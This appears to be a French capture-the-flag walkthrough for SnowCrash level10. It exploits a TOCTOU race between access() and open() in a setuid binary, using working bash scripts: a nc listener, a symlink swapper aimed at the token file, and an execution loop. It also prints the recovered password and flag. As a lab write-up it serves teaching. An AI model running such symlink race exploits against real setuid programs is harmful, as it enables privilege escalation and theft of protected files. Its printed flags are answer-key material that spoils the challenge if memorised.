# level10

Le système de fichier se présente de cette manière:

``` bash
level10@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

En tentant d'exécuter `level10` on a l'exemple d'input à transmetre à l'exécutable `file host`:

```
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
```

On essaie de transmettre 0 localhost (128.0.0.1) le fichier `token` sur lequel nous n'avons aucun droit, la fonction `access()` va retourner -1 et le programme va s'arrêter:

```Diff
level10@SnowCrash:~$ ltrace ./level10 token 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
+access("token", 4)                                                             = -1
+printf("You don't have access to %s\n", "token"You don't have access to token) = 31
+++ exited (status 31) +++
```

En effet malgré que le bit SUID soit activé pour `level10` la fonction `access()` renvoit -1.
Quand un processus est lancé avec le SUID le système lui attribue deux identités:
- `RUID (Real User ID)`: identité réelle de l'utilisateur.
- `EUID (Effective User ID)`: identité que l'utilisateur emprunte pour l'exécution du programme.
La fonction `access()` vérifie le RUID et non l'EUID, il ignore ainsi le pouvoir du SUID.

En utilisant cette fois ltrace avec un fichier sur lequel nous avons les droits on comprend qu'il va faloir écouter une connection provenant du port `6969` sur localhost.

``` bash
level10@SnowCrash:~$ echo "coucou" > /tmp/test
level10@SnowCrash:~$ ltrace ./level10 /tmp/test 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/test", 4)                                                   = 0
printf("Connecting to %s:6969 .. ", "127.0.0.1")                         = 32
fflush(0xb7fd1a20Connecting to 127.0.0.1:6969 .. )                                                       = 0
socket(2, 1, 0)                                                          = 3
inet_addr("127.0.0.1")                                                   = 0x0100007f
htons(6969, 1, 0, 0, 0)                                                  = 14619
connect(3, 0xbffff70c, 16, 0, 0)                                         = -1
printf("Unable to connect to host %s\n", "127.0.0.1"Unable to connect to host 127.0.0.1
)                    = 36
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

Nous ouvrons donc un autre terminal pour utiliser `nc` avec le flag `-l` qui comme le dit le man `[is] Used to specify that nc should listen for an incoming connection rather than initiate a connection to a remote host.`

L'écoute sur le port 6969 indique que le programme restitue le contenu du fichier donné en paramètre au processus qui écoute sur le port 6969 avec `open()`, `read()`, `write()`.

Premier terminal pour lancer le programme:

``` bash
level10@SnowCrash:~$ ltrace ./level10 /tmp/test 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/test", 4)                                                      = 0
printf("Connecting to %s:6969 .. ", "127.0.0.1")                            = 32
fflush(0xb7fd1a20Connecting to 127.0.0.1:6969 .. )                                                          = 0
socket(2, 1, 0)                                                             = 3
inet_addr("127.0.0.1")                                                      = 0x0100007f
htons(6969, 1, 0, 0, 0)                                                     = 14619
connect(3, 0xbffff70c, 16, 0, 0)                                            = 0
write(3, ".*( )*.\n", 8)                                                    = 8
printf("Connected!\nSending file .. "Connected!
)                                      = 27
fflush(0xb7fd1a20Sending file .. )                                                          = 0
open("/tmp/test", 0, 010)                                                   = 4
read(4, "coucou\n", 4096)                                                   = 7
write(3, "coucou\n", 7)                                                     = 7
puts("wrote file!"wrote file!
)                                                         = 12
+++ exited (status 12) +++
```

Deuxième terminal pour lancer l'écoute sur le port 6969:

``` bash
level10@SnowCrash:~$ nc -l 6969
.*( )*.
coucou
```

L'utilisation de `ltrace()` nous permet de voir le recours à la fonction `open()`.

Cette fonction, à la différence de `access()`, ouvre le fichier avec les droits actuels du processus (EUID).

Ici nous faisons face à une faille de type `Time-of-check to time-of-use (TOCTOU)`.

Nous allons trouver un moyen d'exploiter le délai entre la vérification du RUID avec `access()` et l'ouverture du fichier avec `open()`.

Pour cela nous allons lancer trois scripts différents qui vont lancer plusieurs boucles.

Un premier qui permettra de lancer la commande `nc` en boucle et recevoir les données envoyée sur le port 6969 par le programme `level10`.

Un second qui a pour but de créer un fichier sur lequel nous avons les droits puis dans une boucle, de créer un lien qui pointe vers lui puis de le remplacer par un lien du même nom qui pointe vers token.

Un troisième pour lancer en boucle l'exécution du fichier `level10`.

Récepteur:

``` bash
#!/bin/bash

while true; do
    nc -l 6969
    sleep 0.5
done

```

Swapper:

``` bash
#!/bin/bash

FAKE="/tmp/fake"
LINK="/tmp/link"
TARGET="/home/user/level10/token"

touch $FAKE

while true; do
    ln -sf $FAKE $LINK
    ln -sf $TARGET $LINK
done
```

Executeur:

``` bash
#!/bin/bash

while true; do
    /home/user/level10/level10 /tmp/link 127.0.0.1
done
```

Nous lancons les scripts swapper et executeur en arrière plan en redirigeant leur sortie afin de pouvoir voir le résultat du script récepteur.


``` bash
level10@SnowCrash:~$ bash /tmp/executeur > /tmp/exec.txt &
[1] 15348
level10@SnowCrash:~$ bash /tmp/swapper > /tmp/swapper.txt &
[2] 2200
level10@SnowCrash:~$ jobs
[1]-  Running                 bash /tmp/executeur > /tmp/exec.txt &
[2]+  Running                 bash /tmp/swapper > /tmp/swapper.txt &
```

Une fois les trois scripts lancés on récupère le token sur le terminal du script recepteur.

``` bash
level10@SnowCrash:~$ bash /tmp/recepteur
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
```

Et on peut se connecter à flag10 et récupèrer le token avec getflag:

``` bash
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c

```


Commandes utiles:
    - `jobs` : affiche la liste des scripts qui tournent en arrière plan
    - `fg %1` : ramène le jon 1 au premier plan
    - `kill %1` : tue le job 1 proprement
    - `ps aux | grep bash` : pour identifier les PID
    - `kill -9` 

Source:
    - https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
